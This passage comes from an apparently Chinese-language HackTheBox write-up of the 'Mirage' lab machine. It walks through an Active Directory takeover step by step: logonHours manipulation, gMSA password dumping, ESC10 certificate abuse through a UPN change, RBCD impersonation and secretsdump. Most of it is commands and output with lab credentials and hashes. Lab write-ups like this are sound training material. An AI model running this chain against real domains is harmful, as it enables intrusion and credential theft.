CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb\nlogonHours: ////////////////////////////\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过文章可以得到命令：\u003ca href=\"https://activedirectorypro.com/how-to-set-logon-hours-for-active-directory-users/#powershell\"\u003ehttps://activedirectorypro.com/how-to-set-logon-hours-for-active-directory-users/#powershell\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-powershell\"\u003e# 在 NATHAN.AADAM 中运行\n$LogonHours = get-aduser mark.bbond -property logonhours | select-object -expand logonhours\n[byte[]]$Hours = $LogonHours\n$SecPassword = ConvertTo-SecureString '1day@atime' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('MIRAGE\\mark.bbond', $SecPassword)\nset-aduser javier.mmarshall -Cred $Cred -replace @{logonhours = $Hours}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后我们再拿他的\u003ccode\u003eTGT\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003egetTGT.py mirage.htb/\u003cspan class=\"hljs-string\"\u003e'JAVIER.MMARSHALL'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'Password@123'\u003c/span\u003e -dc-ip 10.10.11.78\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eTo Mirage-Service$\u003c/h3\u003e\n\u003cp\u003e通过视图能知道 \u003ccode\u003eJAVIER.MMARSHALL\u003c/code\u003e 能读取\u003ccode\u003eMirage-Service$\u003c/code\u003e 的\u003ccode\u003eGMSA\u003c/code\u003e密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003egMSADumper\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage python gMSADumper.py -d mirage.htb -k\nUsers or \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewho\u003c/span\u003e can \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Mirage-Service$:\n \u003e javier.mmarshall\nMirage-Service$:::305806d84f7c1be93a07aaf40f0c7866\nMirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae\nMirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eTGT\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage getTGT.py mirage.htb/\u003cspan class=\"hljs-string\"\u003e'MIRAGE-SERVICE$'\u003c/span\u003e -hashes :305806d84f7c1be93a07aaf40f0c7866 -dc-ip 10.10.11.78 \n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e MIRAGE-SERVICE$.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举漏洞\u003c/h3\u003e\n\u003cp\u003e拿到\u003ccode\u003eMirage-Service$\u003c/code\u003e 后，在\u003ccode\u003eBLoodHound\u003c/code\u003e中不能直接看到对其他节点有修改权限了\u003c/p\u003e\n\u003cp\u003e这里枚举了好一会，没摸出来什么思路\u003c/p\u003e\n\u003cp\u003e枚举\u003ccode\u003eADCS\u003c/code\u003e的漏洞，也是没能枚举出来漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e 20250722043730_Certipy.txt\nCertificate Authorities\n  0\n    CA Name                             : mirage-DC01-CA\n    DNS Name                            : dc01.mirage.htb\n    Certificate Subject                 : CN=mirage-DC01-CA, DC=mirage, DC=htb\n    Certificate Serial Number           : 1512EEC0308E13A146A0B5AD6AA741C9\n    Certificate Validity Start          : 2025-07-04 19:58:25+00:00\n    Certificate Validity End            : 2125-07-04 20:08:25+00:00\n    Web Enrollment\n      HTTP\n        Enabled                         : False\n      HTTPS\n        Enabled                         : False\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Requests     : Enabled\n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy\n    Permissions\n      Owner                             : MIRAGE.HTB\\Administrators\n      Access Rights\n        ManageCa                        : MIRAGE.HTB\\Administrators\n                                          MIRAGE.HTB\\Domain Admins\n                                          MIRAGE.HTB\\Enterprise Admins\n        ManageCertificates              : MIRAGE.HTB\\Administrators\n                                          MIRAGE.HTB\\Domain Admins\n                                          MIRAGE.HTB\\Enterprise Admins\n        Enroll                          : MIRAGE.HTB\\Authenticated Users\nCertificate Templates                   : [!] Could not find any certificate templates\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是一些 \u003ccode\u003eESC\u003c/code\u003e是无法被脚本探测到的，例如 \u003ccode\u003eESC10\u003c/code\u003e ：\u003ca href=\"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication\"\u003ehttps://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eESC10\u003c/code\u003e 的先决条件：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们首先检查 \u003ccode\u003eCertificateMappingMethods\u003c/code\u003e 注册表项\u003c/p\u003e\n\u003cp\u003e可以看到\u003ccode\u003eCertificateMappingMethods\u003c/code\u003e 注册表项为 \u003ccode\u003e0x4\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\nathan.aadam\\Documents\u003e reg query \u003cspan class=\"hljs-string\"\u003e\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\\"\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\n    EventLogging    REG_DWORD    0x1\n    CertificateMappingMethods    REG_DWORD    0x4\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Ciphers\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\CipherSuites\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Hashes\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\KeyExchangeAlgorithms\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后第二步是需要找到一个能够修改受害者账户的\u003ccode\u003euserPrincipalName\u003c/code\u003e 属性账户，通常是\u003ccode\u003eGenericWrite\u003c/code\u003e 或 \u003ccode\u003eWriteProperty\u003c/code\u003e 权限来实现的\u003c/p\u003e\n\u003cp\u003e查看 \u003ccode\u003eMIRAGE-SERVICE$\u003c/code\u003e 用户的可写属性\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=MIRAGE-SERVICE\\$.ccache\nbloodyAD --kerberos -d \u003cspan class=\"hljs-string\"\u003e\"mirage.htb\"\u003c/span\u003e --host \u003cspan class=\"hljs-string\"\u003e\"dc01.mirage.htb\"\u003c/span\u003e get writable --detail\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能发现 \u003ccode\u003eMIRAGE-SERVICE$\u003c/code\u003e 可以对 \u003ccode\u003emark.bbond\u003c/code\u003e 的 \u003ccode\u003eUPN\u003c/code\u003e 属性可写\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eESC 10\u003c/h3\u003e\n\u003cp\u003e跟着链接走即可：\u003ca href=\"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication\"\u003ehttps://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage certipy-ad account -dc-ip 10.10.11.78 -k -upn \u003cspan class=\"hljs-string\"\u003e'dc01$@mirage.htb'\u003c/span\u003e -target dc01.mirage.htb -user \u003cspan class=\"hljs-string\"\u003e'mark.bbond'\u003c/span\u003e update \nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user \u003cspan class=\"hljs-string\"\u003e'mark.bbond'\u003c/span\u003e:\n    userPrincipalName                   : dc01\u003cspan class=\"hljs-variable\"\u003e$@mirage\u003c/span\u003e.htb\n[*] Successfully updated \u003cspan class=\"hljs-string\"\u003e'mark.bbond'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=mark.bbond.ccache \n➜  Mirage certipy-ad req -dc-ip 10.10.11.78 -k -target \u003cspan class=\"hljs-string\"\u003e'dc01.mirage.htb'\u003c/span\u003e -ca \u003cspan class=\"hljs-string\"\u003e'mirage-DC01-CA'\u003c/span\u003e -template \u003cspan class=\"hljs-string\"\u003e'User'\u003c/span\u003e\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail\n[*] Requesting certificate via RPC\n[*] Request ID is 13\n[*] Successfully requested certificate\n[*] Got certificate with UPN \u003cspan class=\"hljs-string\"\u003e'dc01$@mirage.htb'\u003c/span\u003e\n[*] Certificate object SID is \u003cspan class=\"hljs-string\"\u003e'S-1-5-21-2127163471-3824721834-2568365109-1109'\u003c/span\u003e\n[*] Saving certificate and private key to \u003cspan class=\"hljs-string\"\u003e'dc01.pfx'\u003c/span\u003e\nFile \u003cspan class=\"hljs-string\"\u003e'dc01.pfx'\u003c/span\u003e already exists. Overwrite? (y/n - saying no will save with a unique filename): y\n[*] Wrote certificate and private key to \u003cspan class=\"hljs-string\"\u003e'dc01.pfx'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage certipy-ad account -dc-ip 10.10.11.78 -k -upn \u003cspan class=\"hljs-string\"\u003e'mark.bbond@mirage.htb'\u003c/span\u003e -target dc01.mirage.htb -user \u003cspan class=\"hljs-string\"\u003e'mark.bbond'\u003c/span\u003e update \nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user \u003cspan class=\"hljs-string\"\u003e'mark.bbond'\u003c/span\u003e:\n    userPrincipalName                   : mark.bbond@mirage.htb\n[*] Successfully updated \u003cspan class=\"hljs-string\"\u003e'mark.bbond'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell                                                            \nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: \u003cspan class=\"hljs-string\"\u003e'dc01$@mirage.htb'\u003c/span\u003e\n[*]     Security Extension SID: \u003cspan class=\"hljs-string\"\u003e'S-1-5-21-2127163471-3824721834-2568365109-1109'\u003c/span\u003e\n[*] Connecting to \u003cspan class=\"hljs-string\"\u003e'ldaps://10.10.11.78:636'\u003c/span\u003e\n[*] Authenticated to \u003cspan class=\"hljs-string\"\u003e'10.10.11.78'\u003c/span\u003e as: \u003cspan class=\"hljs-string\"\u003e'u:MIRAGE\\\\DC01$'\u003c/span\u003e\nType \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e list of commands\n\n\u003cspan class=\"hljs-comment\"\u003e# whoami\u003c/span\u003e\nu:MIRAGE\\DC01$\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到 \u003ccode\u003eLDAP shell\u003c/code\u003e后，我们直接设置\u003ccode\u003eRBCD\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# set_rbcd dc01$ NATHAN.AADAM\u003c/span\u003e\nFound Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb\nTarget SID: S-1-5-21-2127163471-3824721834-2568365109-1000\n\nFound Grantee DN: CN=nathan.aadam,OU=Users,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb\nGrantee SID: S-1-5-21-2127163471-3824721834-2568365109-1110\nDelegation rights modified successfully!\nNATHAN.AADAM can now impersonate \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e on dc01$ via S4U2Proxy\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e常规打法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage getST.py -spn \u003cspan class=\"hljs-string\"\u003e'cifs/dc01.mirage.htb'\u003c/span\u003e -impersonate \u003cspan class=\"hljs-string\"\u003e'DC01$'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'mirage.htb/nathan.aadam:3edc#EDC3'\u003c/span\u003e\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\n[*] Impersonating DC01$\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e DC01\u003cspan class=\"hljs-variable\"\u003e$@cifs_dc01\u003c/span\u003e.mirage.htb@MIRAGE.HTB.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后直接上 \u003ccode\u003esecretsdump\u003c/code\u003e 即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Mirage \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=DC01\\\u003cspan class=\"hljs-variable\"\u003e$@cifs_dc01\u003c/span\u003e.mirage.htb@MIRAGE.HTB.ccache\n➜  Mirage secretsdump.py mirage.htb/\u003cspan class=\"hljs-string\"\u003e'DC01$'\u003c/span\u003e@dc01.mirage.htb -k -no-pass\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\n491xxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e任重道远，比之前打的顺很多了\u003c/p\u003e\n\u003cp\u003e前期 \u003ccode\u003eNats\u003c/code\u003e 的利用没想到，其实并不难，只是脑筋转不过来\u003c/p\u003e\n\u003cp\u003e最难的不是利用漏洞，而是寻找漏洞，\u003ccode\u003eESC10\u003c/code\u003e 我是真的想不到那边去，因为在\u003ccode\u003eBloodHound\u003c/code\u003e中，我并没有找到证书颁发机构，最后枚举了了一下才发现有\u003c/p\u003e","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","updated":"2025-07-22","tags":["HackTheBox","Windows","Nats-server","Kerberoasting","BloodyAD","ESC10","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Mirage\n\n https://app.hackthebox.com/machines/Mirage | `Windows` | `Hard`\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n枚举测试\n\n`SMB` 匿名测试\n\n\n\n`RPC` 匿名测试\n\n\n\n`NFS` 枚举\n\n\n\n发现 `/MirageReports`\n\n将其挂载到本机上\n\n\n\n里边是两个`PDF`文件...","isEncrypted":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxSeason8 - Mirage"},"buildId":"Y3nJeCc9colvxStlHZeEt","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>